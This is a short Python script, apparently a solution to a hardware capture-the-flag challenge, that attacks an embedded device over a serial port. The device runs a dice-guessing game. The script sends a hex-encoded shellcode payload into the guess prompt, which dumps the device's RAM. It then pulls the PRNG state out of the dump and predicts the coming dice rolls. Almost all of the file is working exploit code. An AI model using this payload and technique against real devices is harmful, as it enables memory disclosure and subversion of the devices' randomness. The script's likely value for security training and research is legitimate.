#!/usr/bin/env python3

# Copyright 2020, Verizon Media
# Licensed under the terms of the MIT license. See LICENSE file in project root for terms.

# Ensure the device is at the "Guess for dice roll (1-6)?" prompt

import binascii
import serial
import sys
import struct

if len(sys.argv) < 2:
    print("Usage: {} serport".format(sys.argv[0]))
    sys.exit(1)

in_serport = sys.argv[1]
ser = serial.Serial(in_serport, 115200, timeout=1)

DUMP_ALL_RAM_PAYLOAD = binascii.unhexlify("48f20002c2f2000240f20003c2f202030320117800df02f101029a42f9d1704700000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800020") + b'\r\n'

for b in DUMP_ALL_RAM_PAYLOAD:
    ser.write(bytes([b]))
    ser.flush()
    x = ser.read(1)
    assert len(x) == 1

reply = ser.read(0x18000)
# print(reply)

prng_state = reply[0x100:0x100 + 132]
print(prng_state)
print(binascii.hexlify(prng_state))

prng_index = struct.unpack("<I", prng_state[-4:])[0]
print(prng_index)

for i in range(prng_index, 64):
    cachebyte = prng_state[64 + i]
    if cachebyte < 252:
        print("Next roll is {}".format(cachebyte % 6 + 1))
